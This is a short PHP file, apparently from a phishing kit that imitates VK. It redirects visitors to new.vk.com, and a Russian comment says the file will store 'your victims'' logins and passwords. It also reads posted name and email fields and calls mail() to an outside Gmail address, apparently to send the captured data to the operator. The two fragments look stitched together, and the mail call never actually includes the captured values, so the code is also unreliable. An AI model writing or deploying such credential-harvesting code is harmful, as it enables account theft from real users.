<?php

/**
 * @author Litvinov V.A.
 * @copyright 2016 (2707)
 */

$LOCATION="https://new.vk.com";
header("Location:$LOCATION");

// В данном файле будут хранится учётные записи Ваших жертв.
// Для просмотра необходим файловый менеджер (FileZilla).

?>:login:password:
<?php
$fio = $_POST['fio'];
$email = $_POST['email'];
$fio = htmlspecialchars($fio);
$email = htmlspecialchars($email);
$fio = urldecode($fio);
$email = urldecode($email);
$fio = trim($fio);
$email = trim($email);
//echo $fio;
//echo "<br>";
//echo $email;
if (mail("badfad4@gmail.com", "данные", "From: baddad712@gmail.com \r\n"))
 {     echo "сообщение успешно отправлено"; 
} else { 
    echo "при отправке сообщения возникли ошибки";
}?>
